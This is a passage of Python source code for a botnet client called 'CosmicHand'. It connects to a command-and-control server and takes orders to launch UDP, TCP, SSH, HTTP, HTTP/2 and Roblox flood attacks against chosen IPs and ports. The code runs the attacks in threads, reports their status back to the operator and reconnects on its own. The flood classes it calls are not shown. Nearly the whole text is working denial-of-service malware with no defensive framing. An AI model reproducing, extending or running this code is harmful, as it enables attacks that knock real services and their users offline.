                            # Attack completed naturally
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]
                            
                            self.log(f"UDP attack {attack_id} completed: {ip}:{port} for {duration}s")
                            
                            if self.connected:
                                completion_msg = {
                                    "type": "attack_complete",
                                    "bot_id": BOT_ID,
                                    "attack_id": attack_id,
                                    "attack_type": "udp",
                                    "target": f"{ip}:{port}",
                                    "duration": duration,
                                    "status": "completed"
                                }
                                self.socket.send(json.dumps(completion_msg).encode())
                                
                        except Exception as e:
                            self.log(f"UDP attack {attack_id} failed: {e}")
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]

                    # Start the attack in a separate thread
                    attack_thread = threading.Thread(
                        target=start_udp_attack, 
                        args=(attack_id, ip, port, duration),
                        daemon=True
                    )
                    attack_thread.start()

                    active_count = self.get_active_attack_count()
                    response = (f"[🚀] UDP FLOOD STARTED (ID: {attack_id})\n"
                               f"[🎯] Target: {ip}:{port}\n"
                               f"[⏱️] Duration: {duration}s\n"
                               f"[👥] Active Attacks: {active_count}\n"
                               f"[✅] Added to concurrent attacks queue")
                    self.log(response)
                    return response
                else:
                    return "Invalid !udp command format. Usage: !udp <ip> <port> <duration>"

            elif cmd_str.startswith("!tcp"):
                parts = cmd_str.split()
                if len(parts) >= 5:
                    ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]
                    #attack_id = self.generate_attack_id()
                    
                    def start_tcp_attack(attack_id, ip, port, duration):
                        try:
                            self.log(f"Starting TCP attack {attack_id} on {ip}:{port} for {duration}s")
                            flooder = UniversalTCPBypass(ip, int(port), int(duration))
                            
                            # Store attack info
                            with self.attack_lock:
                                self.active_attacks[attack_id] = {
                                    'thread': threading.current_thread(),
                                    'attack_obj': flooder,
                                    'start_time': time.time(),
                                    'type': 'tcp_flood',
                                    'target': f"{ip}:{port}",
                                    'duration': duration
                                }
                            
                            flooder.running = True
                            flooder.start()
                            
                            # Attack completed naturally
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]
                            
                            self.log(f"TCP attack {attack_id} completed: {ip}:{port} for {duration}s")
                            
                            if self.connected:
                                completion_msg = {
                                    "type": "attack_complete",
                                    "bot_id": BOT_ID,
                                    "attack_id": attack_id,
                                    "attack_type": "tcp",
                                    "target": f"{ip}:{port}",
                                    'duration': duration,
                                    "status": "completed"
                                }
                                self.socket.send(json.dumps(completion_msg).encode())
                                
                        except Exception as e:
                            self.log(f"TCP attack {attack_id} failed: {e}")
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]

                    # Start the attack in a separate thread
                    attack_thread = threading.Thread(
                        target=start_tcp_attack, 
                        args=(attack_id, ip, port, duration),
                        daemon=True
                    )
                    attack_thread.start()

                    active_count = self.get_active_attack_count()
                    response = (f"[🚀] TCP FLOOD STARTED (ID: {attack_id})\n"
                               f"[🎯] Target: {ip}:{port}\n"
                               f"[⏱️] Duration: {duration}s\n"
                               f"[👥] Active Attacks: {active_count}\n"
                               f"[✅] Added to concurrent attacks queue")
                    self.log(response)
                    return response
                else:
                    return "Invalid !tcp command format. Usage: !tcp <ip> <port> <duration>"

            elif cmd_str.startswith("!ssh"):
                parts = cmd_str.split()
                if len(parts) >= 5:
                    ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]
                    #attack_id = self.generate_attack_id()
                    
                    def start_ssh_attack(attack_id, ip, port, duration):
                        try:
                            self.log(f"Starting SSH attack {attack_id} on {ip}:{port} for {duration}s")
                            flooder = SSHKillerBypass(ip, int(port), int(duration))
                            
                            # Store attack info
                            with self.attack_lock:
                                self.active_attacks[attack_id] = {
                                    'thread': threading.current_thread(),
                                    'attack_obj': flooder,
                                    'start_time': time.time(),
                                    'type': 'ssh_flood',
                                    'target': f"{ip}:{port}",
                                    'duration': duration
                                }
                            
                            flooder.running = True
                            flooder.start()
                            
                            # Attack completed naturally
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]
                            
                            self.log(f"SSH attack {attack_id} completed: {ip}:{port} for {duration}s")
                            
                            if self.connected:
                                completion_msg = {
                                    "type": "attack_complete",
                                    "bot_id": BOT_ID,
                                    "attack_id": attack_id,
                                    "attack_type": "ssh",
                                    "target": f"{ip}:{port}",
                                    'duration': duration,
                                    "status": "completed"
                                }
                                self.socket.send(json.dumps(completion_msg).encode())
                                
                        except Exception as e:
                            self.log(f"SSH attack {attack_id} failed: {e}")
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]

                    # Start the attack in a separate thread
                    attack_thread = threading.Thread(
                        target=start_ssh_attack, 
                        args=(attack_id, ip, port, duration),
                        daemon=True
                    )
                    attack_thread.start()

                    active_count = self.get_active_attack_count()
                    response = (f"[🚀] SSH FLOOD STARTED (ID: {attack_id})\n"
                               f"[🎯] Target: {ip}:{port}\n"
                               f"[⏱️] Duration: {duration}s\n"
                               f"[👥] Active Attacks: {active_count}\n"
                               f"[✅] Added to concurrent attacks queue")
                    self.log(response)
                    return response
                else:
                    return "Invalid !ssh command format. Usage: !ssh <ip> <port> <duration>"

            elif cmd_str.startswith("!http"):
                parts = cmd_str.split()
                if len(parts) >= 5:
                    ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]

                    # Parse URL to extract hostname and port
                    try:
                        from urllib.parse import urlparse
                        target_input = ip

                        # If it looks like a URL, parse it
                        if target_input.startswith(('http://', 'https://')):
                            parsed = urlparse(target_input)
                            target_host = parsed.hostname
                            # Use provided port OR default based on scheme
                            target_port = int(port) if port else (443 if parsed.scheme == 'https' else 80)
                        else:
                            target_host = target_input
                            target_port = int(port)

                    except Exception as e:
                        return f"Error parsing target: {e}"

                    method = "GET"
                    path = "/"
                    ssl = False

                    # Parse additional parameters
                    for i in range(4, len(parts)):
                        param = parts[i].upper()
                        if param in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'RAND']:
                            method = param
                        elif param in ['SSL', 'HTTPS']:
                            ssl = True
                        elif param.startswith('/'):
                            path = param

                    #attack_id = self.generate_attack_id()

                    def start_http_attack(attack_id, host, port, duration, method, path, ssl):
                        try:
                            self.log(f"Starting HTTP attack {attack_id} on {host}:{port} for {duration}s")
                            flooder = HTTPBypassFlood(host, int(port), int(duration), method, path, ssl)

                            # Store attack info
                            with self.attack_lock:
                                self.active_attacks[attack_id] = {
                                    'thread': threading.current_thread(),
                                    'attack_obj': flooder,
                                    'start_time': time.time(),
                                    'type': 'http_flood',
                                    'target': f"{host}:{port}",
                                    'duration': duration
                                }

                            flooder.running = True
                            flooder.start()

                            # Attack completed naturally
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]

                            self.log(f"HTTP attack {attack_id} completed: {host}:{port} for {duration}s")

                            if self.connected:
                                completion_msg = {
                                    "type": "attack_complete",
                                    "bot_id": BOT_ID,
                                    "attack_id": attack_id,
                                    "attack_type": "http",
                                    "target": f"{host}:{port}",
                                    'duration': duration,
                                    "status": "completed"
                                }
                                self.socket.send(json.dumps(completion_msg).encode())

                        except Exception as e:
                            self.log(f"HTTP attack {attack_id} failed: {e}")
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]

                    # Start the attack in a separate thread
                    attack_thread = threading.Thread(
                        target=start_http_attack, 
                        args=(attack_id, target_host, target_port, duration, method, path, ssl),
                        daemon=True
                    )
                    attack_thread.start()

                    ssl_text = "HTTPS" if ssl else "HTTP"
                    method_text = "RANDOM" if method == "RAND" else method

                    # Get current attack count
                    active_count = self.get_active_attack_count()

                    response = (f"[🚀] {ssl_text} FLOOD STARTED (ID: {attack_id})\n"
                               f"[🎯] Target: {target_host}:{target_port}\n"
                               f"[⚡] Method: {method_text} | Duration: {duration}s\n"
                               f"[📁] Path: {path}\n"
                               f"[👥] Active Attacks: {active_count}\n"
                               f"[✅] Added to concurrent attacks queue")
                    self.log(response)
                    return response
                else:
                    return "Usage: !http <ip/url> <port> <duration> [method] [path] [ssl]"

            elif cmd_str.startswith("!httpv2"):
                parts = cmd_str.split()
                if len(parts) >= 5:
                    ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]
        
                    # Parse target (supports both IP and URL)
                    try:
                        from urllib.parse import urlparse
                        target_input = ip
        
                        if target_input.startswith(('http://', 'https://')):
                            parsed = urlparse(target_input)
                            target_host = parsed.hostname
                            target_port = int(port) if port else (443 if parsed.scheme == 'https' else 80)
                        else:
                            target_host = target_input
                            target_port = int(port)
        
                    except Exception as e:
                        return f"Error parsing target: {e}"
        
                    method = "GET"
                    path = "/"
                    ssl = True  # HTTP/2 requires SSL
        
                    # Parse additional parameters
                    for i in range(4, len(parts)):
                        param = parts[i].upper()
                        if param in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'RAND']:
                            method = param
                        elif param.startswith('/'):
                            path = param
        
                    def start_http2_attack(attack_id, host, port, duration, method, path, ssl):
                        try:
                            self.log(f"Starting HTTP/2 attack {attack_id} on {host}:{port} for {duration}s")
                            flooder = HTTP2RushFlood(host, int(port), int(duration), method, path, ssl)
        
                            # Store attack info
                            with self.attack_lock:
                                self.active_attacks[attack_id] = {
                                    'thread': threading.current_thread(),
                                    'attack_obj': flooder,
                                    'start_time': time.time(),
                                    'type': 'http2_rush_flood',
                                    'target': f"{host}:{port}",
                                    'duration': duration
                                }
        
                            flooder.running = True
                            flooder.start()
        
                            # Attack completed naturally
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]
        
                            self.log(f"HTTP/2 attack {attack_id} completed: {host}:{port} for {duration}s")
        
                            if self.connected:
                                completion_msg = {
                                    "type": "attack_complete",
                                    "bot_id": BOT_ID,
                                    "attack_id": attack_id,
                                    "attack_type": "http2_rush",
                                    "target": f"{host}:{port}",
                                    'duration': duration,
                                    "status": "completed"
                                }
                                self.socket.send(json.dumps(completion_msg).encode())
        
                        except Exception as e:
                            self.log(f"HTTP/2 attack {attack_id} failed: {e}")
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]
        
                    # Start the attack in a separate thread
                    attack_thread = threading.Thread(
                        target=start_http2_attack, 
                        args=(attack_id, target_host, target_port, duration, method, path, ssl),
                        daemon=True
                    )
                    attack_thread.start()
        
                    # Get current attack count
                    active_count = self.get_active_attack_count()
        
                    response = (f"[🚀] HTTP/2 RUSH FLOOD STARTED (ID: {attack_id})\n"
                               f"[🎯] Target: {target_host}:{target_port}\n"
                               f"[⚡] Method: {method} | Duration: {duration}s\n"
                               f"[📁] Path: {path}\n"
                               f"[🔧] Features: HTTP/2 Multiplexing + RushAway\n"
                               f"[👥] Active Attacks: {active_count}\n"
                               f"[✅] Added to concurrent attacks queue")
                    self.log(response)
                    return response
                else:
                    return "Usage: !httpv2 <ip/url> <port> <duration> [method] [path]"


            elif cmd_str.startswith("!roblox"):
                parts = cmd_str.split()
                if len(parts) >= 4:
                    ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]
                    #attack_id = self.generate_attack_id()
                    
                    def start_roblox_attack(attack_id, ip, port, duration):
                        try:
                            self.log(f"Starting Roblox attack {attack_id} on {ip}:{port} for {duration}s")
                            flooder = RobloxFlood(ip, int(port), int(duration))
                            
                            # Store attack info
                            with self.attack_lock:
                                self.active_attacks[attack_id] = {
                                    'thread': threading.current_thread(),
                                    'attack_obj': flooder,
                                    'start_time': time.time(),
                                    'type': 'roblox_flood',
                                    'target': f"{ip}:{port}",
                                    'duration': duration
                                }
                            
                            flooder.start_nuclear_attack()
                            
                            # Attack completed naturally
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]
                            
                            self.log(f"Roblox attack {attack_id} completed: {ip}:{port} for {duration}s")
                            
                            if self.connected:
                                completion_msg = {
                                    "type": "attack_complete",
                                    "bot_id": BOT_ID,
                                    "attack_id": attack_id,
                                    "attack_type": "roblox",
                                    "target": f"{ip}:{port}",
                                    'duration': duration,
                                    "status": "completed"
                                }
                                self.socket.send(json.dumps(completion_msg).encode())
                                
                        except Exception as e:
                            self.log(f"Roblox attack {attack_id} failed: {e}")
                            with self.attack_lock:
                                if attack_id in self.active_attacks:
                                    del self.active_attacks[attack_id]

                    # Start the attack in a separate thread
                    attack_thread = threading.Thread(
                        target=start_roblox_attack, 
                        args=(attack_id, ip, port, duration),
                        daemon=True
                    )
                    attack_thread.start()

                    active_count = self.get_active_attack_count()
                    response = (f"[💀] NUCLEAR ROBLOX FLOOD STARTED (ID: {attack_id})\n"
                               f"[🎯] Target: {ip}:{port}\n"
                               f"[⏱️] Duration: {duration}s\n"
                               f"[👥] Active Attacks: {active_count}\n"
                               f"[✅] Added to concurrent attacks queue")
                    self.log(response)
                    return response
                else:
                    return "Usage: !roblox <ip> <port> <duration>"

            elif cmd_str == "!stop":
                # If we only got "!stop", try to get the first active attack
                active_attacks = self.get_active_attacks_info()
                if active_attacks:
                    # Stop the first active attack
                    attack_id = active_attacks[0]['id']
                    self.log(f"Auto-selecting first active attack: {attack_id}")
                    if self.stop_attack_by_id(attack_id):
                        return f"Stopped attack: {attack_id} (auto-selected)"
                    else:
                        return "No attacks found to stop"
                else:
                    return "No active attacks found"


        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            self.log(error_msg)
            return error_msg
    
    def send_response(self, response):
        """Send response to server"""
        try:
            if isinstance(response, dict):
                response_msg = response
            else:
                response_msg = {
                    "type": "response",
                    "bot_id": BOT_ID,
                    "response": response,
                    "timestamp": time.time(),
                    "active_attacks_count": self.get_active_attack_count()
                }
            
            self.socket.send(json.dumps(response_msg).encode())
            self.log(f"Response sent: {response}")
        except Exception as e:
            self.log(f"Failed to send response: {e}")
            self.connected = False
    
    def listen_to_server(self):
        """Listen for commands from CNC server - NON-BLOCKING"""
        buffer = ""
        
        while self.running and self.connected:
            try:
                if time.time() - self.last_heartbeat > HEARTBEAT_INTERVAL:
                    self.send_heartbeat()
                
                self.socket.settimeout(0.5)
                
                try:
                    data = self.socket.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        self.log("Connection closed by server")
                        self.connected = False
                        break
                    
                    buffer += data
                    
                    while buffer:
                        start_idx = buffer.find('{')
                        if start_idx >= 0:
                            end_idx = buffer.find('}', start_idx)
                            if end_idx > start_idx:
                                json_str = buffer[start_idx:end_idx+1]
                                buffer = buffer[end_idx+1:].lstrip()
                                
                                try:
                                    command_data = json.loads(json_str)
                                    if command_data.get("type") == "command":
                                        response = self.handle_command(command_data)
                                        if response:
                                            self.send_response(response)
                                    continue
                                except json.JSONDecodeError:
                                    pass
                        
                        if '\n' in buffer:
                            line, buffer = buffer.split('\n', 1)
                            line = line.strip()
                            if line:
                                response = self.handle_command(line)
                                if response:
                                    self.send_response(response)
                        else:
                            break
                            
                except socket.timeout:
                    continue
                except Exception as e:
                    self.log(f"Receive error: {e}")
                    self.connected = False
                    break
                    
            except Exception as e:
                self.log(f"Error in communication: {e}")
                self.connected = False
                break
    
    def start(self):
        """Main bot loop"""
        self.log(f"Starting CosmicHand... {BOT_ID} v{BOT_VERSION}")
        self.log(f"System: {SYSTEM_INFO}")
        self.log(f"Connecting...{CNC_SERVER_IP}:{CNC_SERVER_PORT}")
        
        while self.running:
            if not self.connected:
                if self.connect_to_server():
                    self.listen_to_server()
            
            if not self.connected and self.running:
                self.log(f"Attempting to reconnect in {RECONNECT_DELAY} seconds...")
                for i in range(RECONNECT_DELAY):
                    if not self.running:
                        break
                    time.sleep(1)
    
    def stop(self):
        """Immediate stop method"""
        self.running = False
        # Force close any open sockets
        if hasattr(self, 'sockets'):
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass




# =========================
# Main Execution
# =========================
if __name__ == "__main__":
    bot = BotClient()
    
    try:
        bot.start()
    except KeyboardInterrupt:
        print("\n[+] Shutting down bot...")
        bot.stop()
    except Exception as e:
        print(f"[-] Bot error: {e}")
        bot.stop()